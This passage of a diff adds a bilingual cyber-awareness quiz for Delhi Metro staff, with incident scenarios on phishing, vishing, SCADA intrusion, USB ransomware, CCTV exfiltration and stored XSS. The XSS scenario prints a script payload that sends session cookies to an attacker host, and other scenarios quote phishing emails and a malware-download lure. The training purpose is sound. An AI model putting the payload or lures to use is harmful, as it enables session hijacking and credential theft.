+        <div class="badge-name hi-text" style="display:none;">इनसाइडर हंटर</div>
+        <div class="badge-desc en-text">Caught the data exfiltrator</div>
+        <div class="badge-desc hi-text" style="display:none;">डेटा चोर पकड़ा</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CERTIFICATE ═════════════════════════════════════════ -->
+<div class="cert-section" id="certSection">
+  <div class="cert-box">
+    <div style="font-size:3rem; margin-bottom:12px;">🏆</div>
+    <h2 class="en-text">Mission Complete!</h2>
+    <h2 class="hi-text" style="display:none;">मिशन पूर्ण!</h2>
+    <p style="color:#93c5fd; margin:10px 0;" class="en-text">You have successfully completed all 8 DMRC CyberQuest scenarios</p>
+    <p style="color:#93c5fd; margin:10px 0;" class="hi-text" style="display:none;">आपने सभी 8 डीएमआरसी साइबर क्वेस्ट परिदृश्य सफलतापूर्वक पूर्ण किए</p>
+    <div style="margin:20px 0; font-size:2.5rem; font-weight:900; color:var(--gold);" id="finalScore">800 pts</div>
+    <p style="color:var(--subtext); font-size:.85rem;" class="en-text">Delhi Metro Rail Corporation | Cyber Security Awareness Champion</p>
+    <p style="color:var(--subtext); font-size:.85rem;" class="hi-text" style="display:none;">दिल्ली मेट्रो रेल कॉर्पोरेशन | साइबर सुरक्षा जागरूकता चैम्पियन</p>
+  </div>
+</div>
+
+<!-- ══ FOOTER ══════════════════════════════════════════════ -->
+<footer>
+  <p class="en-text">DMRC CyberQuest — Built for <span>Delhi Metro Rail Corporation</span> Cyber Awareness Month | Scenarios based on real DMRC vendor ecosystem</p>
+  <p class="hi-text" style="display:none;">डीएमआरसी साइबर क्वेस्ट — <span>दिल्ली मेट्रो रेल कॉर्पोरेशन</span> साइबर जागरूकता माह | परिदृश्य वास्तविक डीएमआरसी विक्रेता तंत्र पर आधारित</p>
+  <p style="margin-top:8px; color:#3a5a8a; font-size:.72rem;">Vendors referenced: Thales (AFC), NXP Semiconductors, Siemens, Alstom, SAP, NPCI/Airtel NCMC — for educational purposes only</p>
+</footer>
+
+<!-- ══ MODAL ═══════════════════════════════════════════════ -->
+<div class="modal-overlay" id="modalOverlay" onclick="closeOnOverlay(event)">
+  <div class="modal" id="modal">
+    <button class="modal-close" onclick="closeModal()">✕</button>
+    <div id="modalContent"></div>
+  </div>
+</div>
+
+<!-- ══ SCENARIO DATA + JS ══════════════════════════════════ -->
+<script>
+const lang = { current: 'en' };
+let score = 0;
+const completed = new Array(8).fill(false);
+
+function setLang(l) {
+  lang.current = l;
+  document.querySelectorAll('.en-text').forEach(el => el.style.display = l === 'en' ? '' : 'none');
+  document.querySelectorAll('.hi-text').forEach(el => el.style.display = l === 'hi' ? '' : 'none');
+  document.getElementById('btnEn').classList.toggle('active', l === 'en');
+  document.getElementById('btnHi').classList.toggle('active', l === 'hi');
+}
+
+const scenarios = [
+  // ── 0: Thales Phishing ──────────────────────────────────
+  {
+    icon: '🎣',
+    color: 'rgba(232,0,45,.2)',
+    en: {
+      title: 'The Thales Phishing Trap',
+      vendor: 'Thales Group — DMRC AFC & Ticketing System',
+      context: `Thales Group supplies DMRC's Automatic Fare Collection (AFC) system — the backbone of smart ticketing across all metro phases. An IT officer at DMRC's Barakhamba Road headquarters receives the following email at 11:47 PM:`,
+      scene: `FROM: thales-support@thales-india-helpdesk.com
+TO: it.officer@dmrc.org
+SUBJECT: 🚨 URGENT: AFC System Security Patch – Action Required in 2 Hours
+
+Dear DMRC IT Team,
+
+Our security team has identified a CRITICAL vulnerability (CVE-2024-THALES-AFC)
+in the AFC backend affecting Phase III & IV stations.
+
+To apply the emergency patch, we need temporary admin credentials to your
+AFC Management Console.
+
+Please reply with:
+• AFC Admin Username
+• AFC Admin Password
+• Remote Access IP / VPN details
+
+Patch window closes at 02:00 AM. Failure to respond may result in
+system downtime across all metro lines.
+
+Regards,
+Rajesh Mehta | Thales India Support
++91-11-XXXX-XXXX`,
+      question: 'What is the MOST appropriate action for the IT officer to take?',
+      options: [
+        'Reply immediately with the credentials — the patch deadline is urgent',
+        'Forward the email to the team and let someone else decide',
+        'Verify the sender by calling Thales India\'s official number, and report to CISO — never share credentials over email',
+        'Ignore the email; it\'s probably spam'
+      ],
+      correct: 2,
+      feedback: `✅ CORRECT! This is a classic phishing attack. Red flags include: (1) Domain "thales-india-helpdesk.com" is NOT Thales's official domain (thalesgroup.com). (2) Legitimate vendors NEVER ask for passwords via email. (3) Urgency + after-hours timing is a social engineering tactic. Always verify by calling the official number listed on the vendor's official website, then report to your CISO immediately.`,
+      wrongFeedback: `❌ Incorrect. Legitimate vendors like Thales never request credentials over email. The domain "thales-india-helpdesk.com" is NOT official (Thales uses thalesgroup.com). Urgency is a manipulation tactic. Always call the official vendor number to verify and report suspicious emails to your CISO.`
+    },
+    hi: {
+      title: 'थेल्स फिशिंग जाल',
+      vendor: 'थेल्स ग्रुप — डीएमआरसी AFC और टिकटिंग प्रणाली',
+      context: `थेल्स ग्रुप डीएमआरसी के स्वचालित किराया संग्रह (AFC) प्रणाली का आपूर्तिकर्ता है। डीएमआरसी के बाराखंबा रोड मुख्यालय में एक आईटी अधिकारी को रात 11:47 बजे यह ईमेल मिलता है:`,
+      scene: `FROM: thales-support@thales-india-helpdesk.com
+TO: it.officer@dmrc.org
+SUBJECT: 🚨 अत्यावश्यक: AFC सिस्टम सुरक्षा पैच – 2 घंटे में कार्रवाई आवश्यक
+
+प्रिय डीएमआरसी आईटी टीम,
+
+हमारी सुरक्षा टीम ने AFC बैकएंड में CRITICAL भेद्यता (CVE-2024-THALES-AFC)
+की पहचान की है जो Phase III और IV स्टेशनों को प्रभावित करती है।
+
+आपातकालीन पैच लगाने के लिए हमें AFC Management Console के
+अस्थायी एडमिन क्रेडेंशियल चाहिए।
+
+कृपया निम्न जानकारी भेजें:
+• AFC एडमिन यूज़रनेम
+• AFC एडमिन पासवर्ड
+• रिमोट एक्सेस IP / VPN विवरण
+
+पैच विंडो रात 02:00 बजे बंद होगी।
+
+सादर,
+राजेश मेहता | थेल्स इंडिया सपोर्ट`,
+      question: 'आईटी अधिकारी को सबसे उचित कार्रवाई क्या करनी चाहिए?',
+      options: [
+        'तुरंत क्रेडेंशियल भेजें — पैच की समयसीमा जरूरी है',
+        'ईमेल टीम को फॉरवर्ड करें और किसी और को फैसला लेने दें',
+        'थेल्स इंडिया के आधिकारिक नंबर पर कॉल करके सत्यापन करें और CISO को रिपोर्ट करें — ईमेल पर क्रेडेंशियल कभी न भेजें',
+        'ईमेल को अनदेखा करें; शायद स्पैम है'
+      ],
+      correct: 2,
+      feedback: `✅ सही! यह क्लासिक फिशिंग हमला है। खतरे के संकेत: (1) "thales-india-helpdesk.com" थेल्स का आधिकारिक डोमेन नहीं है (thalesgroup.com है)। (2) वैध विक्रेता कभी ईमेल पर पासवर्ड नहीं मांगते। (3) तात्कालिकता और देर रात का समय सोशल इंजीनियरिंग है। हमेशा आधिकारिक नंबर से सत्यापित करें और CISO को रिपोर्ट करें।`,
+      wrongFeedback: `❌ गलत। थेल्स जैसे वैध विक्रेता ईमेल पर क्रेडेंशियल नहीं मांगते। "thales-india-helpdesk.com" आधिकारिक नहीं है। तात्कालिकता एक हेरफेर की रणनीति है। हमेशा आधिकारिक विक्रेता नंबर पर कॉल करें और संदिग्ध ईमेल CISO को रिपोर्ट करें।`
+    }
+  },
+
+  // ── 1: Smart Card ──────────────────────────────────────
+  {
+    icon: '💳',
+    color: 'rgba(245,166,35,.2)',
+    en: {
+      title: 'Smart Card Exploit (Real 2022 Vulnerability)',
+      vendor: 'NXP Semiconductors MiFare DESFire EV1 + Thales AFC',
+      context: `In 2022, security researcher Nikhil Kumar Singh discovered a real vulnerability in DMRC's NXP MiFare DESFire EV1 smart cards. When a top-up transaction at an add-value machine failed, the card was still credited — because the system didn't properly verify payment before updating the card balance. You are the DMRC CISO who has just received the researcher's report. How do you respond?`,
+      scene: `📧 VULNERABILITY REPORT RECEIVED
+From: nikhil.researcher@secmail.in
+Subject: Smart Card Balance Manipulation — DMRC AFC System
+
+Summary:
+• Add-value machine fails to validate payment before writing to card
+• Mifare DESFire EV1 card balance can be topped up without payment
+• Transaction marked "Pending" → auto-refunded
+• Net effect: Free metro rides indefinitely
+• Same vulnerability affects Bengaluru Metro (same card system)
+
+Proof-of-Concept: [Video log attached]
+Severity: HIGH
+Systems affected: All DMRC AFC add-value machines`,
+      question: 'As DMRC CISO, what is your FIRST priority response?',
+      options: [
+        'Post about the vulnerability on social media to warn the public',
+        'Take all AFC add-value machines offline immediately, patch the backend validation logic, and coordinate with Thales and NXP for a permanent fix',
+        'Ignore it — the researcher is probably lying to get publicity',
+        'Offer the researcher a free metro pass as thanks and do nothing else'
+      ],
+      correct: 1,
+      feedback: `✅ CORRECT! Responsible disclosure requires swift action: (1) Temporarily disable affected machines to prevent exploitation. (2) Fix the server-side payment validation — the card should only be credited AFTER payment confirmation. (3) Coordinate with Thales (AFC vendor) and NXP (card manufacturer) for cryptographic fixes. (4) Send a formal acknowledgement to the researcher. Never ignore or publicize unpatched vulnerabilities.`,
+      wrongFeedback: `❌ Incorrect. The correct response is to immediately isolate affected machines and fix the backend validation. Publicizing an unpatched vulnerability enables exploitation. Ignoring it violates responsible security practices and exposes DMRC to financial and reputational risk.`
+    },
+    hi: {
+      title: 'स्मार्ट कार्ड शोषण (वास्तविक 2022 भेद्यता)',
+      vendor: 'NXP सेमीकंडक्टर्स MiFare DESFire EV1 + थेल्स AFC',
+      context: `2022 में सुरक्षा शोधकर्ता निखिल कुमार सिंह ने डीएमआरसी के NXP MiFare DESFire EV1 स्मार्ट कार्ड में वास्तविक भेद्यता खोजी। जब एक टॉप-अप ट्रांजेक्शन फेल होती थी, तो भी कार्ड में पैसे क्रेडिट हो जाते थे। आप डीएमआरसी के CISO हैं जिन्हें रिपोर्ट मिली है। आप कैसे प्रतिक्रिया देंगे?`,
+      scene: `📧 भेद्यता रिपोर्ट प्राप्त हुई
+From: nikhil.researcher@secmail.in
+Subject: स्मार्ट कार्ड बैलेंस हेरफेर — डीएमआरसी AFC प्रणाली
+
+सारांश:
+• भुगतान सत्यापन से पहले ही कार्ड में बैलेंस लिखा जाता है
+• बिना भुगतान के MiFare DESFire EV1 कार्ड टॉप-अप संभव
+• ट्रांजेक्शन "Pending" → स्वतः रिफंड
+• परिणाम: मुफ्त मेट्रो सफर
+• बेंगलुरु मेट्रो भी प्रभावित (समान कार्ड प्रणाली)
+
+गंभीरता: उच्च`,
+      question: 'डीएमआरसी CISO के रूप में आपकी पहली प्राथमिकता क्या होगी?',
+      options: [
+        'सोशल मीडिया पर भेद्यता के बारे में पोस्ट करें',
+        'सभी AFC मशीनें तुरंत बंद करें, बैकएंड वैलिडेशन ठीक करें, और थेल्स व NXP से समन्वय करें',
+        'इसे अनदेखा करें — शोधकर्ता झूठ बोल रहा है',
+        'शोधकर्ता को मुफ्त मेट्रो पास दें और कुछ न करें'
+      ],
+      correct: 1,
+      feedback: `✅ सही! जिम्मेदार प्रकटीकरण के लिए तत्काल कार्रवाई आवश्यक है: (1) प्रभावित मशीनें अस्थायी रूप से बंद करें। (2) भुगतान पुष्टि के बाद ही कार्ड में बैलेंस लिखा जाए — यह सुनिश्चित करें। (3) थेल्स और NXP से स्थायी समाधान के लिए समन्वय करें। (4) शोधकर्ता को औपचारिक स्वीकृति भेजें।`,
+      wrongFeedback: `❌ गलत। सही कदम है प्रभावित मशीनें तुरंत बंद करना और बैकएंड सत्यापन ठीक करना। अनपैच भेद्यता को सार्वजनिक करने से शोषण बढ़ता है।`
+    }
+  },
+
+  // ── 2: SCADA ───────────────────────────────────────────
+  {
+    icon: '🚦',
+    color: 'rgba(0,132,61,.2)',
+    en: {
+      title: 'SCADA Signaling System Attack',
+      vendor: 'Siemens (SCADA/OT) + Alstom — Train Control Systems',
+      context: `DMRC uses Siemens and Alstom signaling systems for train control and SCADA-based monitoring across its network. With the push toward e-maintenance and remote diagnostics, OT systems now have internet-facing interfaces. A network engineer at the Operations Control Center (OCC) notices anomalous SCADA traffic at 3:22 AM — commands are being issued to signaling relays from an unauthorized IP address.`,
+      scene: `🖥️  OCC NETWORK MONITORING ALERT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[03:22:17] ALERT: Unauthorized SCADA Write Command
+Source IP:  45.227.183.12  [UNKNOWN — GeoIP: Eastern Europe]
+Target:     Siemens SINAUT SCADA Node 7 (Yellow Line OCC)
+Command:    RELAY_SWITCH TRACK_SEGMENT_7B → OPEN
+Authorized: NO
+Protocol:   Modbus TCP (Port 502)
+
+Previous normal traffic from: 10.14.2.x [Internal OCC subnet]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️  Track segment 7B serves Hauz Khas interchange —
+    3 trains currently in motion nearby`,
+      question: 'What is the CORRECT immediate response from the OCC engineer?',
+      options: [
+        'Wait and monitor to see if more commands come through',
+        'Immediately isolate the SCADA system from the internet, block the source IP at the firewall, notify the train operator to halt affected trains, and escalate to CERT-In and management',
+        'Reboot the SCADA server and hope it resolves itself',
+        'Email Siemens support and wait for their response before acting'
+      ],
+      correct: 1,
+      feedback: `✅ CORRECT! This is a critical OT cyber-physical attack. The correct response: (1) Physical safety FIRST — notify train operators to halt trains near segment 7B. (2) Isolate the compromised SCADA node — disconnect from internet immediately. (3) Block the malicious IP at firewall. (4) Activate the Cyber Incident Response Plan. (5) Report to CERT-In as this affects critical national infrastructure. Never wait when physical safety is at risk.`,
+      wrongFeedback: `❌ Incorrect. With trains in motion near an affected track, physical safety is the top priority. You must immediately halt trains, isolate the SCADA system from external networks, and escalate. Waiting or rebooting while an active attack is underway risks catastrophic failure.`
+    },
+    hi: {
+      title: 'SCADA सिग्नलिंग प्रणाली हमला',
+      vendor: 'सीमेंस (SCADA/OT) + अल्सटॉम — ट्रेन नियंत्रण प्रणाली',
+      context: `डीएमआरसी ट्रेन नियंत्रण के लिए सीमेंस और अल्सटॉम सिग्नलिंग प्रणाली का उपयोग करता है। OT प्रणालियों में इंटरनेट इंटरफेस आने से खतरा बढ़ा है। OCC में एक नेटवर्क इंजीनियर रात 3:22 बजे असामान्य SCADA ट्राफिक देखता है।`,
+      scene: `🖥️  OCC नेटवर्क मॉनिटरिंग अलर्ट
+━━━━━━━━━━━━━━━━━━━━━━━━━
+[03:22:17] अलर्ट: अनधिकृत SCADA राइट कमांड
+स्रोत IP:  45.227.183.12 [अज्ञात — पूर्वी यूरोप]
+लक्ष्य:   Siemens SINAUT SCADA Node 7 (यलो लाइन)
+कमांड:   RELAY_SWITCH TRACK_7B → OPEN
+अधिकृत: नहीं
+
+⚠️ ट्रैक 7B पर 3 ट्रेनें चल रही हैं
+   (हौज़ खास इंटरचेंज के पास)`,
+      question: 'OCC इंजीनियर की तत्काल सही प्रतिक्रिया क्या होनी चाहिए?',
+      options: [
+        'प्रतीक्षा करें और और कमांड आने पर निगरानी करें',
+        'तुरंत SCADA को इंटरनेट से अलग करें, IP ब्लॉक करें, ट्रेन ऑपरेटर को ट्रेनें रोकने को कहें, और CERT-In को सूचित करें',
+        'SCADA सर्वर रीबूट करें',
+        'सीमेंस सपोर्ट को ईमेल करें और उनके जवाब का इंतजार करें'
+      ],
+      correct: 1,
+      feedback: `✅ सही! यह एक गंभीर OT साइबर-फिजिकल हमला है। सही कदम: (1) पहले सुरक्षा — ट्रेन ऑपरेटर को ट्रेनें रोकने को कहें। (2) SCADA नोड को इंटरनेट से अलग करें। (3) दुर्भावनापूर्ण IP ब्लॉक करें। (4) Cyber Incident Response Plan सक्रिय करें। (5) CERT-In को रिपोर्ट करें।`,
+      wrongFeedback: `❌ गलत। जब ट्रेनें चल रही हों, भौतिक सुरक्षा सर्वोच्च प्राथमिकता है। तुरंत ट्रेनें रोकें और SCADA को अलग करें।`
+    }
+  },
+
+  // ── 3: SAP Vishing ─────────────────────────────────────
+  {
+    icon: '📞',
+    color: 'rgba(0,97,194,.2)',
+    en: {
+      title: 'Fake SAP Vendor Vishing Call',
+      vendor: 'SAP ERP — DMRC Finance & Procurement System',
+      context: `DMRC uses SAP as its enterprise ERP system for finance, procurement, and HR. At 2:30 PM on a busy Monday, the phone rings at the DMRC Finance department. An employee picks up:`,
+      scene: `📞 INCOMING CALL — Finance Department
+
+Caller: "Good afternoon, this is Vikram Sharma from SAP India Technical
+Support. We've detected critical data corruption in your SAP FI module
+affecting vendor payment records. This needs to be fixed within the
+hour or it may cause failed payroll processing for 12,000+ employees.
+
+I need you to install this remote support tool—
+just go to: sap-india-helpdesk.remote-access.net/install.exe
+
+Once installed, share the 6-digit access code with me and I'll
+fix everything remotely. This is an emergency authorized by your
+IT director Mr. Gupta. Time is critical!"`,
+      question: 'The employee should:',
+      options: [
+        'Quickly visit the website and install the tool — payroll must not fail',
+        'Ask the caller to hold, hang up, call SAP India\'s official number independently, verify with IT director in person, and never install software from unknown URLs',
+        'Ask the caller for their employee ID and then comply',
+        'Tell the caller you\'ll call back tomorrow'
+      ],
+      correct: 1,
+      feedback: `✅ CORRECT! This is a vishing (voice phishing) attack. Red flags: (1) Unsolicited urgent call. (2) URL "remote-access.net" is NOT sap.com. (3) Installing .exe files from unknown URLs is a classic malware delivery method. (4) Claiming authority of "IT director Mr. Gupta" without verification is name-dropping manipulation. Always: Hang up → Call back on official numbers → Verify in person.`,
+      wrongFeedback: `❌ Incorrect. This is a vishing attack designed to install remote access malware. The URL is NOT from SAP. Legitimate SAP support never calls unsolicited to install software. Always hang up and independently call SAP's official support line to verify any claims.`
+    },
+    hi: {
+      title: 'नकली SAP विक्रेता विशिंग कॉल',
+      vendor: 'SAP ERP — डीएमआरसी वित्त और खरीद प्रणाली',
+      context: `डीएमआरसी वित्त, खरीद और HR के लिए SAP ERP का उपयोग करता है। एक व्यस्त सोमवार को दोपहर 2:30 बजे वित्त विभाग में फोन आता है:`,
+      scene: `📞 इनकमिंग कॉल — वित्त विभाग
+
+कॉलर: "नमस्ते, मैं विक्रम शर्मा, SAP इंडिया टेक्निकल सपोर्ट से हूँ।
+आपके SAP FI मॉड्यूल में गंभीर डेटा करप्शन मिली है जो
+12,000+ कर्मचारियों की सैलरी को प्रभावित कर सकती है।
+
+कृपया यह रिमोट टूल इंस्टॉल करें:
+sap-india-helpdesk.remote-access.net/install.exe
+
+इंस्टॉल होने के बाद 6-डिजिट कोड बताएं।
+यह आपके IT डायरेक्टर गुप्ता जी ने authorize किया है!"`,
+      question: 'कर्मचारी को क्या करना चाहिए?',
+      options: [
+        'जल्दी वेबसाइट पर जाएं और टूल इंस्टॉल करें — सैलरी नहीं रुकनी चाहिए',
+        'कॉलर को होल्ड करें, फोन रखें, SAP इंडिया का आधिकारिक नंबर खुद खोजकर कॉल करें, IT डायरेक्टर से व्यक्तिगत रूप से सत्यापित करें',
+        'कॉलर का एम्प्लॉयी ID मांगें फिर सहयोग करें',
+        'कल कॉलबैक करने को कहें'
+      ],
+      correct: 1,
+      feedback: `✅ सही! यह विशिंग (वॉयस फिशिंग) हमला है। खतरे के संकेत: (1) अनचाही अर्जेंट कॉल। (2) "remote-access.net" SAP का डोमेन नहीं है। (3) अज्ञात URL से .exe इंस्टॉल करना मालवेयर का क्लासिक तरीका है। (4) "गुप्ता जी ने authorize किया" — बिना जांचे विश्वास न करें। हमेशा: फोन रखें → आधिकारिक नंबर से कॉल करें → व्यक्तिगत रूप से सत्यापित करें।`,
+      wrongFeedback: `❌ गलत। यह रिमोट एक्सेस मालवेयर इंस्टॉल कराने का विशिंग हमला है। URL SAP का नहीं है। हमेशा फोन रखें और SAP के आधिकारिक नंबर से सत्यापित करें।`
+    }
+  },
+
+  // ── 4: USB Ransomware ──────────────────────────────────
+  {
+    icon: '🔴',
+    color: 'rgba(255,61,113,.2)',
+    en: {
+      title: 'Rajiv Chowk Ransomware Drop',
+      vendor: 'DMRC Station IT / Ticketing Terminals',
+      context: `A "lost" USB drive labelled "DMRC Salary Slip Q4 2025" is found in the locker room at Rajiv Chowk station — one of the busiest metro stations in Asia. A curious station staff member plugs it into the ticketing terminal PC while the duty manager is away. Within 4 minutes, this appears on the screen:`,
+      scene: `╔══════════════════════════════════════════╗
+║          ⚠️  YOUR FILES ARE ENCRYPTED ⚠️  ║
+╠══════════════════════════════════════════╣
+║                                          ║
+║  All data on DMRC Station Network has    ║
+║  been encrypted with AES-256.            ║
+║                                          ║
+║  To restore access, pay 15 BTC to:      ║
+║  3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5    ║
+║                                          ║
+║  Deadline: 72 hours                      ║
+║  Files deleted after deadline.           ║
+║                                          ║
+║  DO NOT contact police or IT support.    ║
+╚══════════════════════════════════════════╝`,
+      question: 'The staff member panics. What is the CORRECT sequence of actions?',
+      options: [
+        'Pay the ransom immediately to restore service before passengers notice',
+        'Unplug the USB, physically disconnect the PC from the network, do NOT pay ransom, immediately alert DMRC IT Security and follow the Incident Response Plan',
+        'Restart the computer — it might fix itself',
+        'Try to decrypt the files yourself using online tools'
+      ],
+      correct: 1,
+      feedback: `✅ CORRECT! USB drops are a deliberate social engineering tactic (the label was designed to tempt staff). Response steps: (1) Remove USB and PHYSICALLY disconnect the infected machine from the network to prevent spread. (2) Do NOT pay — payment doesn't guarantee file recovery and funds criminal activity. (3) Call DMRC IT Security immediately. (4) Preserve evidence — don't restart. (5) DMRC should have network segmentation so ticketing PCs cannot access backend systems.`,
+      wrongFeedback: `❌ Incorrect. Paying ransoms encourages more attacks and doesn't guarantee recovery. The critical first step is physical network isolation — disconnect the infected machine immediately to prevent the ransomware from spreading to other station systems.`
+    },
+    hi: {
+      title: 'राजीव चौक रैनसमवेयर ड्रॉप',
+      vendor: 'डीएमआरसी स्टेशन IT / टिकटिंग टर्मिनल',
+      context: `राजीव चौक स्टेशन के लॉकर रूम में "DMRC Salary Slip Q4 2025" लेबल वाली USB मिलती है। एक जिज्ञासु कर्मचारी इसे टिकटिंग टर्मिनल PC में लगा देता है। 4 मिनट में यह दिखता है:`,
+      scene: `╔══════════════════════════════════════════╗
+║      ⚠️  आपकी फाइलें एन्क्रिप्ट हो गई हैं ⚠️  ║
+╠══════════════════════════════════════════╣
+║                                          ║
+║  DMRC स्टेशन नेटवर्क का सारा डेटा       ║
+║  AES-256 से एन्क्रिप्ट हो गया है।       ║
+║                                          ║
+║  एक्सेस बहाल करने के लिए 15 BTC भेजें: ║
+║  3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5   ║
+║                                          ║
+║  समयसीमा: 72 घंटे                       ║
+║  फाइलें उसके बाद डिलीट हो जाएंगी।     ║
+╚══════════════════════════════════════════╝`,
+      question: 'कर्मचारी घबरा जाता है। सही कदमों का क्रम क्या है?',
+      options: [
+        'यात्रियों को पता चलने से पहले तुरंत फिरौती दें',
+        'USB निकालें, PC को नेटवर्क से भौतिक रूप से डिस्कनेक्ट करें, फिरौती न दें, तुरंत DMRC IT सुरक्षा को सूचित करें',
+        'कंप्यूटर रीस्टार्ट करें',
+        'ऑनलाइन टूल से खुद फाइलें डिक्रिप्ट करने की कोशिश करें'
+      ],
+      correct: 1,
+      feedback: `✅ सही! USB ड्रॉप एक जानबूझकर सोशल इंजीनियरिंग तकनीक है। सही कदम: (1) USB निकालें और संक्रमित मशीन को नेटवर्क से भौतिक रूप से अलग करें। (2) फिरौती न दें — इससे फाइलें वापस नहीं आतीं। (3) DMRC IT सुरक्षा को तुरंत कॉल करें। (4) सबूत सुरक्षित रखें — रीस्टार्ट न करें।`,
+      wrongFeedback: `❌ गलत। फिरौती देने से और हमले बढ़ते हैं। पहला कदम है संक्रमित मशीन को तुरंत नेटवर्क से भौतिक रूप से अलग करना।`
+    }
+  },
+
+  // ── 5: CCTV Hijack ─────────────────────────────────────
+  {
+    icon: '📷',
+    color: 'rgba(155,89,182,.2)',
+    en: {
+      title: 'CCTV Network Surveillance Hijack',
+      vendor: 'DMRC Surveillance — 14,600+ CCTV Cameras Network',
+      context: `DMRC operates over 14,600 CCTV cameras across its network — one of the largest metro surveillance systems in the world. A junior SOC analyst notices anomalous outbound traffic at 01:47 AM from the CCTV management server. The traffic is going to an unknown external IP at 4.2 MB/s continuously — far more than the usual backup traffic.`,
+      scene: `🔍 SOC ANALYST DASHBOARD — 01:47 AM
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ALERT: Unusual Outbound Data Transfer
+Source:  CCTV-MGMT-SVR-01 (10.50.1.20)
+Dest IP: 185.234.219.47 [UNKNOWN — Bulletproof Hosting]
+Port:    443 (HTTPS — encrypted tunnel)
+Rate:    4.2 MB/s continuous
+Duration: 47 minutes (Started ~01:00 AM)
+Data transferred: ~11.9 GB
+
+Normal backup: runs 03:00 AM to internal backup server only
+CCTV Feeds: All 14,600 cameras active
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️  Estimated data: LIVE VIDEO STREAMS`,
+      question: 'What should the SOC analyst do FIRST?',
+      options: [
+        'Wait until morning to escalate — it might be a scheduled system update',
+        'Immediately block outbound traffic to the suspicious IP, isolate the CCTV management server, escalate to the Security Manager and CISO, preserve network logs, and report to CERT-In as this is critical infrastructure',
+        'Email the network team and go home — it\'s late',
+        'Restart the CCTV management server to stop the transfer'
+      ],
+      correct: 1,
+      feedback: `✅ CORRECT! 11.9 GB of live CCTV footage streaming to a bulletproof hosting IP is a serious breach. Steps: (1) Block the destination IP at the firewall immediately. (2) Isolate the CCTV server without shutting it down (preserve forensic evidence). (3) Escalate to CISO and Security Manager immediately — do not wait until morning. (4) Preserve all logs for forensic analysis. (5) Report to CERT-In — surveillance of critical metro infrastructure is a national security matter.`,
+      wrongFeedback: `❌ Incorrect. Nearly 12 GB of live surveillance data streaming to an unknown IP at 1 AM is a critical incident — not something to wait on. Immediate containment and escalation is required.`
+    },
+    hi: {
+      title: 'CCTV नेटवर्क निगरानी अपहरण',
+      vendor: 'डीएमआरसी निगरानी — 14,600+ CCTV कैमरा नेटवर्क',
+      context: `डीएमआरसी के 14,600+ CCTV कैमरे हैं — दुनिया के सबसे बड़े मेट्रो निगरानी तंत्रों में से एक। एक SOC एनालिस्ट रात 1:47 बजे CCTV मैनेजमेंट सर्वर से असामान्य आउटबाउंड ट्राफिक देखता है।`,
+      scene: `🔍 SOC एनालिस्ट डैशबोर्ड — 01:47 AM
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+अलर्ट: असामान्य डेटा ट्रांसफर
+स्रोत:    CCTV-MGMT-SVR-01
+गंतव्य IP: 185.234.219.47 [अज्ञात]
+दर:       4.2 MB/s निरंतर
+अवधि:     47 मिनट
+डेटा:     ~11.9 GB
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ अनुमानित: LIVE वीडियो स्ट्रीम`,
+      question: 'SOC एनालिस्ट को सबसे पहले क्या करना चाहिए?',
+      options: [
+        'सुबह तक इंतजार करें — शायद सिस्टम अपडेट हो',
+        'तुरंत संदिग्ध IP को ब्लॉक करें, CCTV सर्वर अलग करें, CISO को जगाएं, लॉग सुरक्षित रखें, CERT-In को रिपोर्ट करें',
+        'नेटवर्क टीम को ईमेल करें और घर जाएं',
+        'CCTV सर्वर रीस्टार्ट करें'
+      ],
+      correct: 1,
+      feedback: `✅ सही! 11.9 GB लाइव CCTV फुटेज का अज्ञात IP को स्ट्रीम होना गंभीर उल्लंघन है। कदम: (1) तुरंत IP ब्लॉक करें। (2) सर्वर अलग करें (बंद न करें — फॉरेंसिक सबूत)। (3) CISO को तुरंत सूचित करें। (4) CERT-In को रिपोर्ट करें — मेट्रो निगरानी राष्ट्रीय सुरक्षा का मामला है।`,
+      wrongFeedback: `❌ गलत। रात 1 बजे 12 GB लाइव निगरानी डेटा अज्ञात IP को जाना गंभीर घटना है — प्रतीक्षा न करें। तुरंत रोकें और CISO को जगाएं।`
+    }
+  },
+
+  // ── 6: XSS ─────────────────────────────────────────────
+  {
+    icon: '💉',
+    color: 'rgba(26,188,156,.2)',
+    en: {
+      title: 'Stored XSS on DMRC Intranet (Real 2024 CVE)',
+      vendor: 'DMRC Intranet Web Application (Reported May 2024)',
+      context: `In May 2024, security researcher Abhishek Aswal discovered a critical Stored Cross-Site Scripting (XSS) vulnerability in the DMRC intranet website — specifically in the user profile section. A malicious actor has already exploited this before the patch was applied. You are the DMRC Web Security team lead. Analyze the situation:`,
+      scene: `🔴 SECURITY INCIDENT REPORT — May 2024
+
+Vulnerability: Stored XSS in /intranet/profile/update endpoint
+Payload found: &lt;script&gt;document.location='https://evil.site/steal?c='+document.cookie&lt;/script&gt;
+Injection point: "Department" field in employee profile form
+Storage: Payload written to database, executed on every profile view
+Impact: Session cookies of ALL users who view attacker's profile
+        are sent to attacker-controlled server
+Affected users: ~3,200 DMRC intranet users
+Attacker goal: Harvest admin session tokens → privilege escalation
+
+Status: Patch NOT yet applied
+Active exploitation: CONFIRMED`,
+      question: 'As Web Security Lead, what is the CORRECT immediate action?',
+      options: [
+        'Just warn users via email not to view that profile',
+        'Immediately take the intranet profile feature offline, invalidate ALL active session tokens (force re-login), sanitize/escape all stored user inputs, implement a Web Application Firewall (WAF), and apply Content Security Policy (CSP) headers',
+        'Delete only the attacker\'s account and continue normally',
+        'Post a public notice on DMRC\'s website about the vulnerability'
+      ],
+      correct: 1,
+      feedback: `✅ CORRECT! For a Stored XSS with active exploitation: (1) Take the vulnerable feature OFFLINE immediately. (2) Invalidate ALL session tokens — any harvested cookies are now useless. (3) Sanitize/encode all existing database entries and fix the input validation. (4) Implement Output Encoding, CSP headers, and HTTPOnly cookie flags. (5) Audit all other user-input fields for similar vulnerabilities. (6) Contact all affected users. Remember: Stored XSS is more dangerous than Reflected XSS because it persists.`,
